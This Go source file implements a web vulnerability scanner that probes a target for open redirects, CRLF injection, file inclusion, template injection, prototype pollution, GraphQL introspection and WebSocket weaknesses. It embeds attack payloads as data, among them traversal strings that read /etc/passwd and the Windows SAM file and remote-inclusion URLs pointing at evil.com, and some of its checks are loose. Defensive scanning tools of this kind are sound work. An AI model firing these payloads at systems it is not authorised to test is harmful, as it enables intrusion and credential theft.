package scanner

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"regexp"
	"strings"
	"time"
)

type WebScanResult struct {
	Target    string         `json:"target"`
	Timestamp time.Time      `json:"timestamp"`
	Clickjack *ClickjackResult `json:"clickjack,omitempty"`
	Redirect  *RedirectResult  `json:"redirect,omitempty"`
	CRLF      *CRLFResult      `json:"cRLF,omitempty"`
	FileInc   *FileIncResult    `json:"file_inclusion,omitempty"`
	SSTI      *SSTIResult       `json:"ssti,omitempty"`
	Prototype *PrototypeResult  `json:"prototype_pollution,omitempty"`
	GQLIntros *GQLIntrosResult  `json:"graphql_introspection,omitempty"`
	WS        *WSJSTestResult   `json:"websocket_security,omitempty"`
	Errors    []string          `json:"errors,omitempty"`
}

type ClickjackResult struct {
	Target          string `json:"target"`
	XFrameOptions   string `json:"x_frame_options,omitempty"`
	CSPFrameAncestors string `json:"csp_frame_ancestors,omitempty"`
	Vulnerable      bool   `json:"vulnerable"`
	Remediation     string `json:"remediation,omitempty"`
}

type RedirectResult struct {
	Target    string         `json:"target"`
	Vulns     []RedirectVuln `json:"vulns,omitempty"`
	Count     int            `json:"count"`
}

type RedirectVuln struct {
	Param       string `json:"param"`
	Payload     string `json:"payload"`
	Location    string `json:"location"`
	StatusCode  int    `json:"status_code"`
	Severity    string `json:"severity"`
}

type CRLFResult struct {
	Target    string         `json:"target"`
	Vulnerable bool         `json:"vulnerable"`
	Payloads  []CRLFPayload  `json:"payloads,omitempty"`
}

type CRLFPayload struct {
	Payload   string `json:"payload"`
	Response  string `json:"response"`
	Reflected bool   `json:"reflected"`
}

type FileIncResult struct {
	Target    string         `json:"target"`
	LFI       []FileIncVuln  `json:"lfi,omitempty"`
	RFI       []FileIncVuln  `json:"rfi,omitempty"`
}

type FileIncVuln struct {
	Pattern  string `json:"pattern"`
	Payload  string `json:"payload"`
	Response string `json:"response"`
	Severity string `json:"severity"`
}

type SSTIResult struct {
	Target     string       `json:"target"`
	Vulnerable bool         `json:"vulnerable"`
	Payloads   []SSTIPayload `json:"payloads,omitempty"`
}

type SSTIPayload struct {
	Engine   string `json:"engine"`
	Payload  string `json:"payload"`
	Response string `json:"response"`
	Executed bool   `json:"executed"`
}

type PrototypeResult struct {
	Target    string `json:"target"`
	Vulns     []PrototypeVuln `json:"vulns,omitempty"`
}

type PrototypeVuln struct {
	Param    string `json:"param"`
	Payload  string `json:"payload"`
	Response string `json:"response"`
	Severity string `json:"severity"`
}

type GQLIntrosResult struct {
	Target         string       `json:"target"`
	Introspection  bool         `json:"introspection_enabled"`
	SchemaTypes    []string     `json:"schema_types,omitempty"`
	QueryTypes     []string     `json:"query_types,omitempty"`
	MutationTypes  []string     `json:"mutation_types,omitempty"`
}

type WSJSTestResult struct {
	Target        string         `json:"target"`
	MissingAuth   bool           `json:"missing_auth"`
	CrossSiteWS   bool           `json:"cross_site_websocket_hijacking"`
	MessageInject bool           `json:"message_injection"`
	Findings      []WSJSFinding  `json:"findings,omitempty"`
}

type WSJSFinding struct {
	Type       string `json:"type"`
	Severity   string `json:"severity"`
	Detail     string `json:"detail"`
	Remediation string `json:"remediation"`
}

func Clickjacking(ctx context.Context, target string) (*ClickjackResult, error) {
	printProgress("Testing clickjacking on %s", target)
	result := &ClickjackResult{Target: target}

	url := target
	if !strings.HasPrefix(url, "http") {
		url = "https://" + url
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := client.Get(url)
	if err != nil {
		return result, fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()

	result.XFrameOptions = resp.Header.Get("X-Frame-Options")
	csp := resp.Header.Get("Content-Security-Policy")
	if csp != "" {
		for _, directive := range strings.Split(csp, ";") {
			directive = strings.TrimSpace(directive)
			if strings.HasPrefix(strings.ToLower(directive), "frame-ancestors") {
				result.CSPFrameAncestors = directive
				break
			}
		}
	}

	if result.XFrameOptions == "" && result.CSPFrameAncestors == "" {
		result.Vulnerable = true
		result.Remediation = "Add X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors 'none'"
	} else if strings.ToUpper(result.XFrameOptions) == "ALLOWALL" {
		result.Vulnerable = true
		result.Remediation = "Change X-Frame-Options to DENY or SAMEORIGIN"
	}

	printProgress("Clickjacking: vulnerable=%v", result.Vulnerable)
	return result, nil
}

func OpenRedirectExtended(ctx context.Context, target string) (*RedirectResult, error) {
	printProgress("Testing open redirects on %s", target)
	result := &RedirectResult{Target: target}

	url := target
	if !strings.HasPrefix(url, "http") {
		url = "https://" + url
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	params := []string{
		"url", "redirect", "next", "return", "continue",
		"dest", "redirect_uri", "return_url", "go", "out",
		"view", "to", "target", "redir", "redirect_url",
		"redirect_to", "checkout_url", "return_to", "callback",
	}

	payloads := []string{
		"https://evil.com",
		"//evil.com",
		"//evil.com%2F%2F.evil.com",
		"///evil.com",
		"https://evil.com%00.example.com",
		"\\evil.com",
	}

	for _, param := range params {
		for _, payload := range payloads {
			testURL := url + "?" + param + "=" + payload

			resp, err := client.Get(testURL)
			if err != nil {
				continue
			}
			resp.Body.Close()

			if resp.StatusCode >= 300 && resp.StatusCode < 400 {
				loc := resp.Header.Get("Location")
				if strings.Contains(loc, "evil.com") {
					result.Vulns = append(result.Vulns, RedirectVuln{
						Param:      param,
						Payload:    payload,
						Location:   loc,
						StatusCode: resp.StatusCode,
						Severity:   "medium",
					})
					break
				}
			}
		}
	}

	result.Count = len(result.Vulns)
	printProgress("Open redirects: %d found", result.Count)
	return result, nil
}

func CRLFInjection(ctx context.Context, target string) (*CRLFResult, error) {
	printProgress("Testing CRLF injection on %s", target)
	result := &CRLFResult{Target: target}

	url := target
	if !strings.HasPrefix(url, "http") {
		url = "https://" + url
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	payloads := []string{
		"%0d%0aInjected-Header:crlf",
		"%0D%0AInjected-Header:crlf",
		"\r\nInjected-Header:crlf",
		"%0d%0a%0d%0a<script>alert(1)</script>",
		"\\r\\nInjected-Header:crlf",
	}

	for _, payload := range payloads {
		testURL := url + "?test=" + payload

		resp, err := client.Get(testURL)
		if err != nil {
			continue
		}
		resp.Header.Get("Injected-Header")
		resp.Body.Close()

		for key := range resp.Header {
			if strings.ToLower(key) == "injected-header" {
				result.Vulnerable = true
				result.Payloads = append(result.Payloads, CRLFPayload{
					Payload:   payload,
					Response:  resp.Header.Get(key),
					Reflected: true,
				})
				break
			}
		}
	}

	printProgress("CRLF injection: vulnerable=%v", result.Vulnerable)
	return result, nil
}

func FileInclusion(ctx context.Context, target string) (*FileIncResult, error) {
	printProgress("Testing file inclusion on %s", target)
	result := &FileIncResult{Target: target}

	url := target
	if !strings.HasPrefix(url, "http") {
		url = "https://" + url
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	lfiPatterns := []struct {
		pattern string
		severity string
	}{
		{"../../../etc/passwd", "high"},
		{"..\\..\\..\\windows\\system32\\config\\sam", "high"},
		{"....//....//....//etc/passwd", "high"},
		{"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "high"},
		{"..%252f..%252f..%252fetc/passwd", "high"},
		{"%00../../../etc/passwd", "critical"},
	}

	lfiIndicators := []string{
		"root:x:0:0:",
		"[boot loader]",
		"[fonts]",
		"daemon:",
	}

	for _, p := range lfiPatterns {
		testURL := url + "?file=" + p.pattern

		resp, err := client.Get(testURL)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
		resp.Body.Close()

		bodyStr := string(body)
		for _, indicator := range lfiIndicators {
			if strings.Contains(bodyStr, indicator) {
				result.LFI = append(result.LFI, FileIncVuln{
					Pattern:  p.pattern,
					Payload:  p.pattern,
					Response: indicator,
					Severity: p.severity,
				})
				break
			}
		}
	}

	rfiPayloads := []string{
		"http://evil.com/shell.txt",
		"//evil.com/shell.txt",
		"ftp://evil.com/shell.txt",
	}

	for _, payload := range rfiPayloads {
		testURL := url + "?file=" + payload

		resp, err := client.Get(testURL)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()

		if resp.StatusCode == 200 && len(body) > 0 {
			bodyStr := string(body)
			if !strings.Contains(bodyStr, "error") && !strings.Contains(bodyStr, "404") {
				result.RFI = append(result.RFI, FileIncVuln{
					Pattern:  payload,
					Payload:  payload,
					Response: bodyStr[:min(len(bodyStr), 100)],
					Severity: "critical",
				})
			}
		}
	}

	printProgress("File inclusion: LFI=%d, RFI=%d", len(result.LFI), len(result.RFI))
	return result, nil
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func TemplateInjection(ctx context.Context, target string) (*SSTIResult, error) {
	printProgress("Testing SSTI on %s", target)
	result := &SSTIResult{Target: target}

	url := target
	if !strings.HasPrefix(url, "http") {
		url = "https://" + url
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	payloads := []struct {
		engine  string
		payload string
		confirm string
	}{
		{"jinja2", "{{7*7}}", "49"},
		{"jinja2", "{{config}}", "Config"},
		{"twig", "{{7*7}}", "49"},
		{"freemarker", "${7*7}", "49"},
		{"velocity", "#set($x=7*7)$x", "49"},
		{"ejs", "<%= 7*7 %>", "49"},
		{"erb", "<%= 7*7 %>", "49"},
		{"handlebars", "{{7*7}}", "49"},
		{"pug", "#{7*7}", "49"},
	}

	for _, p := range payloads {
		testURL := url + "?name=" + p.payload

		resp, err := client.Get(testURL)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
		resp.Body.Close()

		bodyStr := string(body)
		if strings.Contains(bodyStr, p.confirm) {
			result.Vulnerable = true
			result.Payloads = append(result.Payloads, SSTIPayload{
				Engine:   p.engine,
				Payload:  p.payload,
				Response: bodyStr[:min(len(bodyStr), 200)],
				Executed: true,
			})
		}
	}

	printProgress("SSTI: vulnerable=%v, engines=%d", result.Vulnerable, len(result.Payloads))
	return result, nil
}

func PrototypePollution(ctx context.Context, target string) (*PrototypeResult, error) {
	printProgress("Testing prototype pollution on %s", target)
	result := &PrototypeResult{Target: target}

	url := target
	if !strings.HasPrefix(url, "http") {
		url = "https://" + url
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	payloads := []struct {
		param   string
		payload string
	}{
		{"__proto__[test]", "polluted"},
		{"constructor[prototype][test]", "polluted"},
		{"__proto__.test", "polluted"},
	}

	for _, p := range payloads {
		testURL := url + "?" + p.param + "=" + p.payload

		resp, err := client.Get(testURL)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()

		bodyStr := string(body)
		if strings.Contains(bodyStr, "polluted") || strings.Contains(bodyStr, "test") {
			result.Vulns = append(result.Vulns, PrototypeVuln{
				Param:    p.param,
				Payload:  p.payload,
				Response: bodyStr[:min(len(bodyStr), 100)],
				Severity: "high",
			})
		}
	}

	printProgress("Prototype pollution: %d vulns found", len(result.Vulns))
	return result, nil
}

func GraphQLIntrospectionExtended(ctx context.Context, target string) (*GQLIntrosResult, error) {
	printProgress("Testing GraphQL introspection on %s", target)
	result := &GQLIntrosResult{Target: target}

	url := target
	if !strings.HasPrefix(url, "http") {
		url = "https://" + url
	}

	client := &http.Client{Timeout: 15 * time.Second}

	introspectionQuery := `{"query":"{ __schema { queryType { name } types { name kind } } }"}`

	req, err := http.NewRequestWithContext(ctx, "POST", url, strings.NewReader(introspectionQuery))
	if err != nil {
		return result, fmt.Errorf("request failed: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return result, fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 32768))
	bodyStr := string(body)

	if resp.StatusCode == 200 && strings.Contains(bodyStr, "__schema") {
		result.Introspection = true

		typeRe := regexp.MustCompile(`"name"\s*:\s*"([^"]+)"`)
		matches := typeRe.FindAllStringSubmatch(bodyStr, -1)
		seen := make(map[string]bool)
		for _, match := range matches {
			if !seen[match[1]] && match[1] != "" {
				seen[match[1]] = true
				result.SchemaTypes = append(result.SchemaTypes, match[1])
			}
		}

		queryRe := regexp.MustCompile(`"queryType"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"`)
		if qMatch := queryRe.FindStringSubmatch(bodyStr); len(qMatch) > 1 {
			result.QueryTypes = append(result.QueryTypes, qMatch[1])
		}

		mutationRe := regexp.MustCompile(`"mutationType"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"`)
		if mMatch := mutationRe.FindStringSubmatch(bodyStr); len(mMatch) > 1 {
			result.MutationTypes = append(result.MutationTypes, mMatch[1])
		}
	}

	printProgress("GraphQL introspection: enabled=%v, types=%d", result.Introspection, len(result.SchemaTypes))
	return result, nil
}

func WSJSTesting(ctx context.Context, target string) (*WSJSTestResult, error) {
	printProgress("Testing WebSocket security on %s", target)
	result := &WSJSTestResult{Target: target}

	wsURL := target
	if strings.HasPrefix(wsURL, "http://") {
		wsURL = "ws://" + strings.TrimPrefix(wsURL, "http://")
	} else if strings.HasPrefix(wsURL, "https://") {
		wsURL = "wss://" + strings.TrimPrefix(wsURL, "https://")
	} else if !strings.HasPrefix(wsURL, "ws") {
		wsURL = "wss://" + wsURL
	}

	client := &http.Client{Timeout: 10 * time.Second}

	upgradeReq, err := http.NewRequestWithContext(ctx, "GET", wsURL, nil)
	if err == nil {
		upgradeReq.Header.Set("Connection", "Upgrade")
		upgradeReq.Header.Set("Upgrade", "websocket")
		upgradeReq.Header.Set("Sec-WebSocket-Version", "13")
		upgradeReq.Header.Set("Sec-WebSocket-Key", "dGhlIHNhbXBsZSBub25jZQ==")
		upgradeReq.Header.Set("Origin", "https://evil.com")

		resp, err := client.Do(upgradeReq)
		if err == nil {
			resp.Body.Close()

			if resp.StatusCode == 101 {
				result.MissingAuth = true
				result.Findings = append(result.Findings, WSJSFinding{
					Type:       "ws_no_auth",
					Severity:   "high",
					Detail:     "WebSocket accepts connections without authentication",
					Remediation: "Authenticate WebSocket connections during handshake",
				})
			}

			acao := resp.Header.Get("Access-Control-Allow-Origin")
			if acao == "*" || acao == "https://evil.com" {
				result.CrossSiteWS = true
				result.Findings = append(result.Findings, WSJSFinding{
					Type:       "ws_cswh",
					Severity:   "high",
					Detail:     "Origin not validated during WebSocket handshake",
					Remediation: "Validate Origin header against trusted domains",
				})
			}
		}
	}

	testURL := wsURL + "?message=<script>alert(1)</script>"
	testReq, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
	if err == nil {
		testReq.Header.Set("Connection", "Upgrade")
		testReq.Header.Set("Upgrade", "websocket")
		testReq.Header.Set("Sec-WebSocket-Version", "13")
		testReq.Header.Set("Sec-WebSocket-Key", "dGhlIHNhbXBsZSBub25jZQ==")

		resp, err := client.Do(testReq)
		if err == nil {
			resp.Body.Close()
			if resp.StatusCode == 101 {
				result.MessageInject = true
				result.Findings = append(result.Findings, WSJSFinding{
					Type:       "ws_injection",
					Severity:   "medium",
					Detail:     "Server accepts messages with special characters",
					Remediation: "Validate and sanitize all WebSocket message content",
				})
			}
		}
	}

	printProgress("WebSocket security: auth=%v, cswh=%v, inject=%v",
		!result.MissingAuth, result.CrossSiteWS, result.MessageInject)
	return result, nil
}

func FullWebScan(ctx context.Context, target, outputDir string) (WebScanResult, error) {
	result := WebScanResult{
		Target:    target,
		Timestamp: time.Now(),
	}

	printProgress("=== Web Security Scan on %s ===", target)

	clickjack, err := Clickjacking(ctx, target)
	if err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("clickjack: %v", err))
	} else {
		result.Clickjack = clickjack
	}

	redirect, err := OpenRedirectExtended(ctx, target)
	if err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("redirect: %v", err))
	} else {
		result.Redirect = redirect
	}

	crlf, err := CRLFInjection(ctx, target)
	if err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("crlf: %v", err))
	} else {
		result.CRLF = crlf
	}

	fileInc, err := FileInclusion(ctx, target)
	if err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("file_inclusion: %v", err))
	} else {
		result.FileInc = fileInc
	}

	ssti, err := TemplateInjection(ctx, target)
	if err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("ssti: %v", err))
	} else {
		result.SSTI = ssti
	}

	proto, err := PrototypePollution(ctx, target)
	if err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("prototype: %v", err))
	} else {
		result.Prototype = proto
	}

	gqlURL := target + "/graphql"
	gql, err := GraphQLIntrospectionExtended(ctx, gqlURL)
	if err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("graphql: %v", err))
	} else {
		result.GQLIntros = gql
	}

	ws, err := WSJSTesting(ctx, target)
	if err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("ws: %v", err))
	} else {
		result.WS = ws
	}

	return result, nil
}
